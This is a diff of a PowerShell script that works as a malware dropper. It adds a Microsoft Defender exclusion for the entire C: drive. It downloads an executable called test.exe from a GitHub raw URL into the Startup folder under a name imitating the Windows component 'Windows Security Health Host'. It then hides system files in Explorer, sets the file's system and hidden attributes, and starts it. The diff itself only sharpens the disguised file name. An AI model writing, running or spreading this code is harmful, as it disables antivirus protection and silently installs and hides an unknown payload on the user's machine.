@@ -1,9 +1,9 @@
 Add-MpPreference -ExclusionPath "C:\"
-Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/vibha000x7/ViaProxy-3.3.3-Java8/refs/heads/main/test.exe' -OutFile "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Security Health Host.exe"
+Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/vibha000x7/ViaProxy-3.3.3-Java8/refs/heads/main/test.exe' -OutFile "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Windows Security Health Host.exe"
 Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" -Name "Hidden" -Value 1
 Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" -Name "ShowSuperHidden" -Value 0
-attrib +s +h "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Security Health Host.exe"
-Start-Process "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Security Health Host.exe"
+attrib +s +h "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Windows Security Health Host.exe"
+Start-Process "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Windows Security Health Host.exe"
 $psScriptContent = @'
 Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" -Name "ShowSuperHidden" -Value 0
 '@
